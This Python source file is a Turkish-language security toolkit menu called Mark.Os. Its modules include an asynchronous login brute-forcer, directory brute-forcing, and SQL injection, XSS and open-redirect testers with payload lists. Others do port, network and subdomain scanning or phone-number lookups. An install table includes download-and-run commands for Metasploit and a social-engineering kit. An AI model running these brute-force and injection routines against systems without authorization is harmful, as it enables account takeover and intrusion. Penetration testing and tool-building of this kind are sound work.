#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔══════════════════════════════════════════════════════════════════╗
║  Mark.Os v2.1 - Ultimate Cyber Security Distribution System     ║
║  Gelişmiş Ofansif & Defansif Güvenlik Araçları Paneli           ║
║  HATA DÜZELTİLDİ - TAM ÇALIŞAN SÜRÜM                          ║
╚══════════════════════════════════════════════════════════════════╝
"""

import os
import sys
import time
import socket
import platform
import asyncio
import subprocess
import hashlib
import base64
import urllib.parse
import urllib.request
import json
import ssl
import re
import random
import string
import ipaddress
import threading
from datetime import datetime

# ═══════════════════════════════════════════════════════════════════
#                  KÜTÜPHANE YÜKLEYİCİ & IMPORT
# ═══════════════════════════════════════════════════════════════════

REQUIRED_LIBS = {
    "colorama": "colorama",
    "requests": "requests",
    "aiohttp": "aiohttp",
}

def install_lib(package):
    print(f"    [!] {package} kuruluyor...")
    os.system(f"{sys.executable} -m pip install {package} -q")

for mod, pkg in REQUIRED_LIBS.items():
    try:
        __import__(mod)
    except ImportError:
        install_lib(pkg)

from colorama import Fore, Style, init
import requests
import aiohttp
init(autoreset=True)

DNS_AVAILABLE = False
PHONE_AVAILABLE = False
try:
    import dns.resolver
    DNS_AVAILABLE = True
except ImportError:
    pass
try:
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    PHONE_AVAILABLE = True
except ImportError:
    pass

# ═══════════════════════════════════════════════════════════════════
#                       GLOBAL DURUM BAYRAKLARI
# ═══════════════════════════════════════════════════════════════════

SIFRE_BULUNDU = False
BULUNAN_SIFRE = None
STOP_THREADS = False

# ═══════════════════════════════════════════════════════════════════
#                    YARDIMCI FONKSİYONLAR
# ═══════════════════════════════════════════════════════════════════

def clear():
    os.system("clear" if os.name != "nt" else "cls")

def pause():
    input(f"\n{Fore.CYAN}[Enter] Ana menüye dönmek için...")

def banner():
    clear()
    print(f"""{Fore.RED}
  ███╗   ███╗ █████╗ ██████╗ ██╗  ██╗   ██████╗ ███████╗
  ████╗ ████║██╔══██╗██╔══██╗██║ ██╔╝  ██╔═══██╗██╔════╝
  ██╔████╔██║███████║██████╔╝█████╔╝   ██║   ██║███████╗
  ██║╚██╔╝██║██╔══██║██╔══██╗██╔═██╗   ██║   ██║╚════██║
  ██║ ╚═╝ ██║██║  ██║██║  ██║██║  ██╗  ╚██████╔╝███████║
  ╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═════╝ ╚══════╝
    {Fore.CYAN}--- Mark.Os v2.1 | Ultimate Cyber Security Arsenal ---
    {Fore.WHITE}Platform: {platform.system()} {platform.release()} | Python: {platform.python_version()}
    {Fore.GREEN}[+] Kütüphaneler: {'dnspython ' if DNS_AVAILABLE else ''}{'phonenumbers' if PHONE_AVAILABLE else ''}
    {Fore.YELLOW}[!] Yalnızca yetkili sistemlerde kullanın
    """)

def check_tool(cmd_name):
    check_cmd = "where" if os.name == "nt" else "which"
    try:
        res = subprocess.run([check_cmd, cmd_name], capture_output=True, text=True, shell=(os.name == "nt"))
        return bool(res.stdout.strip())
    except:
        return False

def run_tool(cmd_name, install_pkg, arac_adi, custom_run=None):
    print(f"\n{Fore.YELLOW}[*] {arac_adi} kontrol ediliyor...")
    if check_tool(cmd_name):
        print(f"{Fore.GREEN}[+] {arac_adi} hazır!")
        if custom_run:
            custom_run()
        else:
            os.system(cmd_name)
    else:
        print(f"{Fore.RED}[-] {arac_adi} bulunamadı!")
        if input(f"{Fore.CYAN}[?] Kurulum talimatları? (e/h): ").lower() == "e":
            print_install_help(cmd_name, install_pkg, arac_adi)

def print_install_help(cmd_name, install_pkg, arac_adi):
    print(f"\n{Fore.YELLOW}[!] {arac_adi} Kurulumu:")
    if platform.system() == "Windows":
        print(f"{Fore.WHITE}  WSL kurun veya Kali Linux kullanın.")
    else:
        komut = {
            "nmap": "sudo apt install nmap -y",
            "sqlmap": "sudo apt install sqlmap -y",
            "msfconsole": "curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall",
            "gobuster": "sudo apt install gobuster -y",
            "nikto": "sudo apt install nikto -y",
            "wpscan": "sudo apt install wpscan -y",
            "dirb": "sudo apt install dirb -y",
            "masscan": "sudo apt install masscan -y",
            "theharvester": "sudo apt install theharvester -y",
            "john": "sudo apt install john -y",
            "hydra": "sudo apt install hydra -y",
            "aircrack-ng": "sudo apt install aircrack-ng -y",
            "tshark": "sudo apt install tshark -y",
            "nc": "sudo apt install netcat -y",
            "recon-ng": "sudo apt install recon-ng -y",
            "setoolkit": "git clone https://github.com/trustedsec/social-engineer-toolkit/ set/ && cd set && sudo python3 setup.py",
            "burpsuite": "sudo snap install burpsuite --classic",
        }
        print(f"{Fore.WHITE}  {komut.get(cmd_name, f'sudo apt install {install_pkg} -y')}")

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 1: TCP PORT ZAFİYET ANALİZÖRÜ
# ═══════════════════════════════════════════════════════════════════

def port_scanner():
    print(f"\n{Fore.YELLOW}[*] Mark.Os TCP Port Zafiyet Analizörü")
    ip = input(f"{Fore.GREEN}Hedef IP: ").strip()
    if not ip:
        print(f"{Fore.RED}[-] IP boş!"); return

    ports = {
        21: "FTP", 22: "SSH", 23: "Telnet", 25: "SMTP", 53: "DNS",
        80: "HTTP", 110: "POP3", 135: "MSRPC", 139: "NetBIOS", 143: "IMAP",
        443: "HTTPS", 445: "SMB", 3306: "MySQL", 3389: "RDP",
        5432: "PostgreSQL", 5900: "VNC", 8080: "HTTP-Proxy", 8443: "HTTPS-Alt"
    }

    print(f"{Fore.CYAN}[*] {len(ports)} port taranıyor: {ip}")
    acik = []
    for port, svc in ports.items():
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.8)
            if s.connect_ex((ip, port)) == 0:
                acik.append((port, svc))
                uyari = ""
                if port in [21, 23, 25, 110, 143]:
                    uyari = f" {Fore.RED}[⚠ Şifresiz]"
                print(f"{Fore.GREEN}[+] AÇIK -> {port}/{svc}{uyari}")
            s.close()
        except:
            pass
    print(f"{Fore.YELLOW}[*] {len(acik)} açık port bulundu.")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 2: REDRAY BRUTE-FORCE MOTORU
# ═══════════════════════════════════════════════════════════════════

async def asenkron_req(session, url, u_field, p_field, user, pwd, success_word):
    global SIFRE_BULUNDU, BULUNAN_SIFRE
    if SIFRE_BULUNDU:
        return
    try:
        async with session.post(url, data={u_field: user, p_field: pwd}, timeout=aiohttp.ClientTimeout(total=8)) as resp:
            text = await resp.text()
            if success_word and success_word.lower() in text.lower():
                SIFRE_BULUNDU = True; BULUNAN_SIFRE = pwd; return
            hatalar = ["hatali", "wrong", "invalid", "incorrect", "error", "failed", "başarısız", "unsuccessful"]
            if resp.status == 200 and not any(h in text.lower() for h in hatalar):
                SIFRE_BULUNDU = True; BULUNAN_SIFRE = pwd
    except:
        pass

async def redray_core(url, u_field, p_field, user, wordlist, success_word):
    connector = aiohttp.TCPConnector(limit=50, ssl=False)
    async with aiohttp.ClientSession(connector=connector) as session:
        tasks = [asenkron_req(session, url, u_field, p_field, user, pwd, success_word) for pwd in wordlist]
        await asyncio.gather(*tasks)

def redray_brute_force():
    global SIFRE_BULUNDU, BULUNAN_SIFRE
    print(f"\n{Fore.RED}[🚨] Redray Asenkron Brute-Force Motoru")
    print(f"{Fore.YELLOW}[!] Sadece kendi sistemlerinizde kullanın!")
    
    url = input(f"{Fore.GREEN}Login URL: ").strip()
    u_field = input(f"{Fore.GREEN}User Field [username]: ").strip() or "username"
    p_field = input(f"{Fore.GREEN}Pass Field [password]: ").strip() or "password"
    user = input(f"{Fore.GREEN}Hedef Kullanıcı: ").strip()
    w_path = input(f"{Fore.GREEN}Wordlist: ").strip()
    success_word = input(f"{Fore.GREEN}Başarılı giriş belirteci (opsiyonel): ").strip()
    
    if not all([url, user, w_path]):
        print(f"{Fore.RED}[-] Gerekli alanlar boş!"); return
    
    try:
        with open(w_path, "r", encoding="utf-8", errors="ignore") as f:
            wordlist = [l.strip() for l in f if l.strip()]
        if not wordlist:
            print(f"{Fore.RED}[-] Wordlist boş!"); return
        
        SIFRE_BULUNDU = False; BULUNAN_SIFRE = None
        print(f"{Fore.YELLOW}[*] {len(wordlist)} şifre test ediliyor...")
        asyncio.run(redray_core(url, u_field, p_field, user, wordlist, success_word))
        
        if SIFRE_BULUNDU:
            print(f"\n{Fore.GREEN}{'='*50}\n[+] ŞİFRE BULUNDU: {BULUNAN_SIFRE}\n{'='*50}")
        else:
            print(f"\n{Fore.RED}[-] Şifre bulunamadı.")
    except FileNotFoundError:
        print(f"{Fore.RED}[-] Wordlist bulunamadı!")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 3: IP COĞRAFİ KONUM
# ═══════════════════════════════════════════════════════════════════

def ip_geo_locator():
    print(f"\n{Fore.YELLOW}[*] IP Coğrafi Konum Çözücü")
    ip = input(f"{Fore.GREEN}IP (boş=kendi IP): ").strip()
    try:
        url = f"http://ip-api.com/json/{ip}" if ip else "http://ip-api.com/json/"
        r = requests.get(url, timeout=10)
        data = r.json()
        if data.get("status") == "success":
            print(f"\n{Fore.GREEN}{'='*50}")
            print(f"  IP        : {data.get('query')}")
            print(f"  Ülke      : {data.get('country')} ({data.get('countryCode')})")
            print(f"  Bölge     : {data.get('regionName')}")
            print(f"  Şehir     : {data.get('city')}")
            print(f"  ZIP       : {data.get('zip')}")
            print(f"  ISP       : {data.get('isp')}")
            print(f"  Org       : {data.get('org')}")
            print(f"  Zaman     : {data.get('timezone')}")
            lat, lon = data.get('lat'), data.get('lon')
            if lat and lon:
                print(f"{Fore.CYAN}  Harita    : https://maps.google.com/?q={lat},{lon}")
            print(f"{Fore.GREEN}{'='*50}")
        else:
            print(f"{Fore.RED}[-] Geçersiz IP.")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 4: WHOIS SORGULAMA
# ═══════════════════════════════════════════════════════════════════

def whois_lookup():
    print(f"\n{Fore.YELLOW}[*] WHOIS Domain Sorgulama")
    domain = input(f"{Fore.GREEN}Domain: ").strip()
    if not domain:
        print(f"{Fore.RED}[-] Domain boş!"); return
    try:
        req = urllib.request.Request(f"https://api.hackertarget.com/whois/?q={domain}", headers={'User-Agent': 'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=15) as resp:
            data = resp.read().decode('utf-8', errors='ignore')
            print(f"\n{Fore.GREEN}[+] WHOIS:\n{Fore.WHITE}{data[:2500]}")
    except Exception as e:
        print(f"{Fore.RED}[-] Hata: {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 5: DNS ENUMERATION
# ═══════════════════════════════════════════════════════════════════

def dns_enumeration():
    print(f"\n{Fore.YELLOW}[*] DNS Enumeration")
    domain = input(f"{Fore.GREEN}Domain: ").strip()
    if not domain:
        print(f"{Fore.RED}[-] Domain boş!"); return
    if not DNS_AVAILABLE:
        print(f"{Fore.RED}[-] dnspython gerekli! pip install dnspython"); return
    
    for rtype in ['A', 'AAAA', 'MX', 'NS', 'TXT', 'SOA', 'CNAME']:
        try:
            answers = dns.resolver.resolve(domain, rtype)
            print(f"{Fore.GREEN}[+] {rtype}:")
            for rdata in answers:
                print(f"    {Fore.WHITE}{rdata}")
        except:
            pass
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 6: SUBDOMAIN SCANNER
# ═══════════════════════════════════════════════════════════════════

def subdomain_scanner():
    print(f"\n{Fore.YELLOW}[*] Subdomain Scanner")
    domain = input(f"{Fore.GREEN}Domain: ").strip()
    if not domain:
        print(f"{Fore.RED}[-] Domain boş!"); return
    
    wordlist = ["www", "mail", "ftp", "admin", "blog", "shop", "api", "dev",
                "test", "portal", "vpn", "remote", "webmail", "ns1", "ns2",
                "smtp", "pop", "imap", "cdn", "static", "media", "support",
                "help", "docs", "wiki", "forum", "news", "beta", "staging",
                "login", "panel", "backup", "v2", "app", "m", "en"]
    
    print(f"{Fore.CYAN}[*] {len(wordlist)} subdomain taranıyor...")
    bulunan = []
    for sub in wordlist:
        full = f"{sub}.{domain}"
        try:
            socket.gethostbyname(full)
            print(f"{Fore.GREEN}[+] {full}")
            bulunan.append(full)
        except:
            pass
    print(f"{Fore.YELLOW}[*] {len(bulunan)} subdomain bulundu.")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 7: DİZİN BRUTE-FORCE
# ═══════════════════════════════════════════════════════════════════

def dir_bruteforce():
    print(f"\n{Fore.YELLOW}[*] Web Dizin Brute-Force")
    url = input(f"{Fore.GREEN}Hedef URL: ").strip().rstrip('/')
    if not url:
        print(f"{Fore.RED}[-] URL boş!"); return
    
    wordlist = ["/admin", "/login", "/wp-admin", "/phpmyadmin", "/config",
                "/backup", "/api", "/test", "/dev", "/panel", "/dashboard",
                "/robots.txt", "/sitemap.xml", "/.env", "/.git", "/uploads",
                "/images", "/css", "/js", "/api/v1", "/swagger", "/phpinfo.php",
                "/admin.php", "/login.php", "/register", "/user", "/account",
                "/xmlrpc.php", "/wp-content", "/wp-includes", "/vendor",
                "/cgi-bin", "/server-status", "/.htaccess", "/.aws"]
    
    print(f"{Fore.CYAN}[*] {len(wordlist)} dizin taranıyor...")
    for path in wordlist:
        try:
            r = requests.get(f"{url}{path}", timeout=5, allow_redirects=False)
            if r.status_code in [200, 301, 302, 401, 403]:
                print(f"{Fore.GREEN}[+] [{r.status_code}] {path}")
        except:
            pass
    print(f"{Fore.YELLOW}[*] Tarama tamamlandı.")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 8: HASH TESPİT & ÜRETİM
# ═══════════════════════════════════════════════════════════════════

def hash_identifier():
    print(f"\n{Fore.YELLOW}[*] Hash Identifier & Generator")
    print("1 - Hash Tipi Tespiti\n2 - Hash Üret")
    secim = input(f"{Fore.GREEN}Seçim: ").strip()
    
    if secim == "1":
        h = input(f"{Fore.GREEN}Hash: ").strip()
        if not h: return
        uzunluk = len(h)
        patterns = {32: "MD5", 40: "SHA1 / MySQL5", 64: "SHA256", 128: "SHA512"}
        tip = patterns.get(uzunluk, "Bilinmiyor")
        print(f"{Fore.GREEN}[+] Muhtemel Tip: {tip} (Uzunluk: {uzunluk})")
        if not re.match(r'^[a-fA-F0-9]+$', h):
            print(f"{Fore.YELLOW}[!] Hex formatında değil - Base64 olabilir.")
    
    elif secim == "2":
        text = input(f"{Fore.GREEN}Metin: ").strip()
        if not text: return
        print(f"\n{Fore.CYAN}MD5   : {hashlib.md5(text.encode()).hexdigest()}")
        print(f"SHA1  : {hashlib.sha1(text.encode()).hexdigest()}")
        print(f"SHA256: {hashlib.sha256(text.encode()).hexdigest()}")
        print(f"SHA512: {hashlib.sha512(text.encode()).hexdigest()}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 9: ŞİFRE ÜRETİCİ
# ═══════════════════════════════════════════════════════════════════

def password_generator():
    print(f"\n{Fore.YELLOW}[*] Güçlü Şifre Üretici")
    try:
        uzunluk = int(input(f"{Fore.GREEN}Uzunluk [16]: ").strip() or "16")
        adet = int(input(f"{Fore.GREEN}Adet [5]: ").strip() or "5")
    except:
        print(f"{Fore.RED}[-] Geçersiz sayı!"); return
    
    kar = string.ascii_letters + string.digits + "!@#$%^&*()_+-=[]{}|;:,.<>?"
    print(f"\n{Fore.GREEN}[+] Şifreler:")
    for i in range(adet):
        print(f"  {i+1}. {Fore.WHITE}{''.join(random.choice(kar) for _ in range(uzunluk))}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 10: AĞ TARAMA (Ping Sweep)
# ═══════════════════════════════════════════════════════════════════

def network_scanner():
    print(f"\n{Fore.YELLOW}[*] Yerel Ağ Tarama (Ping Sweep)")
    ip_range = input(f"{Fore.GREEN}IP Aralığı (örn: 192.168.1.0/24): ").strip()
    if not ip_range:
        print(f"{Fore.RED}[-] Aralık boş!"); return
    try:
        net = ipaddress.ip_network(ip_range, strict=False)
    except:
        print(f"{Fore.RED}[-] Geçersiz aralık!"); return
    
    print(f"{Fore.CYAN}[*] {net.num_addresses} host taranıyor...")
    aktif = []
    def ping(ip):
        param = "-n" if os.name == "nt" else "-c"
        try:
            if subprocess.run(["ping", param, "1", str(ip)], capture_output=True, timeout=2).returncode == 0:
                print(f"{Fore.GREEN}[+] AKTİF: {ip}")
                aktif.append(str(ip))
        except:
            pass
    
    threads = []
    for ip in net.hosts():
        t = threading.Thread(target=ping, args=(ip,))
        t.daemon = True; threads.append(t); t.start()
        if len(threads) >= 50:
            for t in threads: t.join(timeout=3)
            threads = []
    for t in threads: t.join(timeout=3)
    print(f"{Fore.YELLOW}[*] {len(aktif)} aktif host.")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 11: HTTP HEADER ANALİZİ
# ═══════════════════════════════════════════════════════════════════

def http_header_analyzer():
    print(f"\n{Fore.YELLOW}[*] HTTP Header Analizörü")
    url = input(f"{Fore.GREEN}URL: ").strip()
    if not url: return
    if not url.startswith(('http://','https://')): url = 'http://'+url
    try:
        r = requests.get(url, timeout=10, allow_redirects=True)
        print(f"\n{Fore.GREEN}[+] {r.status_code} {r.reason}")
        print(f"{Fore.CYAN}[+] Headers:")
        for k,v in r.headers.items():
            print(f"  {Fore.WHITE}{k}: {v}")
        
        sec = {
            'X-Frame-Options':'Clickjacking','X-XSS-Protection':'XSS',
            'X-Content-Type-Options':'MIME sniffing','Content-Security-Policy':'CSP',
            'Strict-Transport-Security':'HSTS','Referrer-Policy':'Referrer',
            'Permissions-Policy':'Feature Policy'
        }
        print(f"\n{Fore.YELLOW}[*] Güvenlik Header:")
        for h,d in sec.items():
            if h in r.headers:
                print(f"  {Fore.GREEN}[✓] {d}")
            else:
                print(f"  {Fore.RED}[✗] {d} EKSİK")
    except Exception as e:
        print(f"{Fore.RED}[-] {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 12: SSL/TLS SERTİFİKA
# ═══════════════════════════════════════════════════════════════════

def ssl_checker():
    print(f"\n{Fore.YELLOW}[*] SSL/TLS Sertifika Kontrolü")
    host = input(f"{Fore.GREEN}Hostname: ").strip()
    if not host: return
    try:
        ctx = ssl.create_default_context()
        with socket.create_connection((host, 443), timeout=10) as sock:
            with ctx.wrap_socket(sock, server_hostname=host) as ssock:
                cert = ssock.getpeercert()
                ciph = ssock.cipher()
                ver = ssock.version()
                print(f"\n{Fore.GREEN}[+] TLS: {ver} | Şifre: {ciph[0]}")
                print(f"  Issuer : {cert.get('issuer')}")
                print(f"  Başlangıç: {cert.get('notBefore')}")
                print(f"  Bitiş    : {cert.get('notAfter')}")
                if ver in ["TLSv1","TLSv1.1"]:
                    print(f"{Fore.RED}[⚠] ZAYIF TLS sürümü!")
                elif ver == "TLSv1.2":
                    print(f"{Fore.YELLOW}[!] TLS 1.2 - TLS 1.3 önerilir.")
                else:
                    print(f"{Fore.GREEN}[+] TLS 1.3 - Mükemmel!")
    except Exception as e:
        print(f"{Fore.RED}[-] {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 13: BANNER GRABBING
# ═══════════════════════════════════════════════════════════════════

def banner_grabbing():
    print(f"\n{Fore.YELLOW}[*] Banner Yakalama")
    ip = input(f"{Fore.GREEN}Hedef IP: ").strip()
    port_str = input(f"{Fore.GREEN}Port [80]: ").strip() or "80"
    if not ip: return
    try:
        port = int(port_str)
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(5)
        s.connect((ip, port))
        if port in [80,8080,443,8443]:
            s.send(f"HEAD / HTTP/1.1\r\nHost: {ip}\r\n\r\n".encode())
        banner = s.recv(4096).decode('utf-8',errors='ignore').strip()
        s.close()
        if banner:
            print(f"\n{Fore.GREEN}[+] Banner:\n{Fore.WHITE}{banner[:500]}")
        else:
            print(f"{Fore.RED}[-] Banner boş.")
    except Exception as e:
        print(f"{Fore.RED}[-] {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 14: ENCODE/DECODE
# ═══════════════════════════════════════════════════════════════════

def encode_decode_tool():
    print(f"\n{Fore.YELLOW}[*] Encode/Decode")
    print("1-Base64E 2-Base64D 3-URL E 4-URL D 5-HexE 6-HexD 7-ROT13")
    secim = input(f"{Fore.GREEN}Seçim: ").strip()
    text = input(f"{Fore.GREEN}Metin: ").strip()
    if not text: return
    try:
        if secim == "1": print(f"{Fore.GREEN}[+] {base64.b64encode(text.encode()).decode()}")
        elif secim == "2": print(f"{Fore.GREEN}[+] {base64.b64decode(text).decode()}")
        elif secim == "3": print(f"{Fore.GREEN}[+] {urllib.parse.quote(text)}")
        elif secim == "4": print(f"{Fore.GREEN}[+] {urllib.parse.unquote(text)}")
        elif secim == "5": print(f"{Fore.GREEN}[+] {text.encode().hex()}")
        elif secim == "6": print(f"{Fore.GREEN}[+] {bytes.fromhex(text).decode()}")
        elif secim == "7":
            t = str.maketrans('ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz','NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm')
            print(f"{Fore.GREEN}[+] {text.translate(t)}")
    except Exception as e:
        print(f"{Fore.RED}[-] {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 15: ROBOTS.TXT & SITEMAP
# ═══════════════════════════════════════════════════════════════════

def robots_checker():
    print(f"\n{Fore.YELLOW}[*] robots.txt & Sitemap")
    url = input(f"{Fore.GREEN}URL: ").strip().rstrip('/')
    if not url: return
    for path in ['/robots.txt','/sitemap.xml']:
        try:
            r = requests.get(f"{url}{path}", timeout=10)
            if r.status_code == 200:
                print(f"{Fore.GREEN}[+] {path} BULUNDU:")
                if path == '/robots.txt':
                    print(f"{Fore.WHITE}{r.text[:1500]}")
                    gizli = [l for l in r.text.split('\n') if l.startswith('Disallow:') and len(l) > 12]
                    if gizli:
                        print(f"{Fore.YELLOW}[!] Gizli dizinler:")
                        for l in gizli: print(f"  {Fore.CYAN}{l}")
                else:
                    print(f"{Fore.WHITE}{r.text[:500]}")
            else:
                print(f"{Fore.RED}[-] {path} ({r.status_code})")
        except:
            print(f"{Fore.RED}[-] {path} başarısız")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 16: CLICKJACKING TEST
# ═══════════════════════════════════════════════════════════════════

def clickjacking_tester():
    print(f"\n{Fore.YELLOW}[*] Clickjacking Testi")
    url = input(f"{Fore.GREEN}URL: ").strip()
    if not url: return
    if not url.startswith(('http://','https://')): url = 'http://'+url
    try:
        r = requests.get(url, timeout=10)
        xfo = r.headers.get('X-Frame-Options','').upper()
        csp = r.headers.get('Content-Security-Policy','')
        print(f"\n{Fore.CYAN}[*] Analiz:")
        if xfo in ['DENY','SAMEORIGIN']:
            print(f"{Fore.GREEN}[+] X-Frame-Options: {xfo} - KORUNUYOR")
        else:
            print(f"{Fore.RED}[-] X-Frame-Options EKSİK - ZAFİYETLİ!")
        if "frame-ancestors" in csp:
            print(f"{Fore.GREEN}[+] CSP frame-ancestors mevcut.")
        print(f"\n{Fore.WHITE}PoC: <iframe src=\"{url}\" width=\"800\" height=\"600\"></iframe>")
    except Exception as e:
        print(f"{Fore.RED}[-] {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 17: EMAIL MX KONTROL
# ═══════════════════════════════════════════════════════════════════

def email_mx_checker():
    print(f"\n{Fore.YELLOW}[*] MX Kayıt Sorgulama")
    domain = input(f"{Fore.GREEN}Domain: ").strip()
    if not domain: return
    if not DNS_AVAILABLE:
        print(f"{Fore.RED}[-] dnspython gerekli!"); return
    try:
        answers = dns.resolver.resolve(domain, 'MX')
        print(f"{Fore.GREEN}[+] MX Kayıtları:")
        for r in answers:
            print(f"  {Fore.WHITE}Priority: {r.preference} | {r.exchange}")
    except Exception as e:
        print(f"{Fore.RED}[-] {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 18: TELEFON OSINT
# ═══════════════════════════════════════════════════════════════════

def phone_osint():
    print(f"\n{Fore.YELLOW}[*] Telefon OSINT")
    if not PHONE_AVAILABLE:
        print(f"{Fore.RED}[-] phonenumbers gerekli! pip install phonenumbers"); return
    num = input(f"{Fore.GREEN}Numara (+905551234567): ").strip()
    if not num: return
    try:
        p = phonenumbers.parse(num)
        print(f"\n{Fore.GREEN}[+] Sonuçlar:")
        print(f"  Geçerli   : {'Evet' if phonenumbers.is_valid_number(p) else 'Hayır'}")
        print(f"  Bölge     : {geocoder.description_for_number(p, 'tr')}")
        print(f"  Operatör  : {carrier.name_for_number(p, 'tr')}")
        print(f"  Zaman Dilimi: {', '.join(timezone.time_zones_for_number(p))}")
        print(f"  E.164     : {phonenumbers.format_number(p, phonenumbers.PhoneNumberFormat.E164)}")
        print(f"  Uluslararası: {phonenumbers.format_number(p, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}")
    except Exception as e:
        print(f"{Fore.RED}[-] {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 19: SQLi TARAYICI
# ═══════════════════════════════════════════════════════════════════

def sqli_scanner():
    print(f"\n{Fore.YELLOW}[*] SQL Injection Hata Pattern Tarayıcı")
    print(f"{Fore.RED}[!] Sadece yetkili testlerde!")
    url = input(f"{Fore.GREEN}Hedef URL (örn: http://site.com/page?id=1): ").strip()
    if not url: return
    
    payloads = ["'", "\"", "1'", "1\"", "' OR '1'='1", "\" OR \"1\"=\"1", "1 AND 1=1", "1 AND 1=2"]
    hata = ["sql syntax","mysql_fetch","pg_query","ora-","odbc sql server",
            "unclosed quotation","quoted string","syntax error","warning: mysql",
            "sqlstate","sqlite_query"]
    
    print(f"{Fore.CYAN}[*] {len(payloads)} payload test ediliyor...")
    for payload in payloads:
        try:
            test_url = f"{url}{payload}" if "?" in url else f"{url}?id={payload}"
            r = requests.get(test_url, timeout=8)
            for pat in hata:
                if pat in r.text.lower():
                    print(f"\n{Fore.RED}{'='*50}")
                    print(f"{Fore.RED}[🚨] SQLi BULUNDU! Payload: {payload}")
                    print(f"{Fore.RED}    Pattern: {pat}")
                    print(f"{Fore.RED}{'='*50}")
                    pause(); return
            print(f"{Fore.GREEN}[+] {payload} | Temiz")
        except Exception as e:
            print(f"{Fore.RED}[-] {payload}: {e}")
    print(f"{Fore.YELLOW}[*] Test tamam. SQLi bulunamadı.")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 20: XSS TESTER
# ═══════════════════════════════════════════════════════════════════

def xss_tester():
    print(f"\n{Fore.YELLOW}[*] Reflected XSS Tester")
    print(f"{Fore.RED}[!] Sadece yetkili testlerde!")
    url = input(f"{Fore.GREEN}Hedef URL (parametreli): ").strip()
    if not url or "?" not in url:
        print(f"{Fore.RED}[-] Parametre içeren URL gerekli!"); return
    
    payloads = ["<script>alert('XSS')</script>","\"><script>alert('XSS')</script>",
                "'><script>alert('XSS')</script>","<img src=x onerror=alert('XSS')>"]
    
    for payload in payloads:
        try:
            parsed = urllib.parse.urlparse(url)
            qs = urllib.parse.parse_qs(parsed.query)
            if not qs: continue
            ilk = list(qs.keys())[0]
            yeni_qs = urllib.parse.urlencode({k: (payload if k==ilk else v[0]) for k,v in qs.items()})
            test_url = urllib.parse.urlunparse(parsed._replace(query=yeni_qs))
            r = requests.get(test_url, timeout=8)
            if payload in r.text:
                print(f"\n{Fore.RED}[🚨] REFLECTED XSS! Parametre: {ilk}")
                print(f"    Payload: {payload}")
                pause(); return
            print(f"{Fore.GREEN}[+] {payload[:25]}... | Temiz")
        except Exception as e:
            print(f"{Fore.RED}[-] {e}")
    print(f"{Fore.YELLOW}[*] XSS bulunamadı.")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 21: OPEN REDIRECT TEST
# ═══════════════════════════════════════════════════════════════════

def open_redirect_tester():
    print(f"\n{Fore.YELLOW}[*] Open Redirect Testi")
    url = input(f"{Fore.GREEN}Hedef URL (redirect parametreli, TARGET yazın): ").strip()
    if not url: return
    for p in ["https://evil.com","//evil.com","/\\evil.com"]:
        try:
            t = url.replace("TARGET",p) if "TARGET" in url else f"{url}{p}"
            r = requests.get(t, timeout=8, allow_redirects=False)
            if r.status_code in [301,302,307,308] and 'evil.com' in r.headers.get('Location',''):
                print(f"{Fore.RED}[🚨] OPEN REDIRECT! Payload: {p}"); pause(); return
            print(f"{Fore.GREEN}[+] {p} | Güvenli")
        except Exception as e:
            print(f"{Fore.RED}[-] {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 22: CSRF TOKEN KONTROL
# ═══════════════════════════════════════════════════════════════════

def csrf_checker():
    print(f"\n{Fore.YELLOW}[*] CSRF Token Kontrolü")
    url = input(f"{Fore.GREEN}Form URL: ").strip()
    if not url: return
    try:
        r = requests.get(url, timeout=10)
        tokens = ['csrf','xsrf','_token','authenticity_token','csrf_token']
        bulunan = [t for t in tokens if t in r.text.lower()]
        if bulunan:
            print(f"{Fore.GREEN}[+] CSRF token bulundu: {', '.join(bulunan)}")
        else:
            print(f"{Fore.RED}[⚠] CSRF token BULUNAMADI! Savunmasız olabilir.")
    except Exception as e:
        print(f"{Fore.RED}[-] {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 23: WORDPRESS ENUM
# ═══════════════════════════════════════════════════════════════════

def wordpress_enum():
    print(f"\n{Fore.YELLOW}[*] WordPress Tespit & Enum")
    url = input(f"{Fore.GREEN}Site URL: ").strip().rstrip('/')
    if not url: return
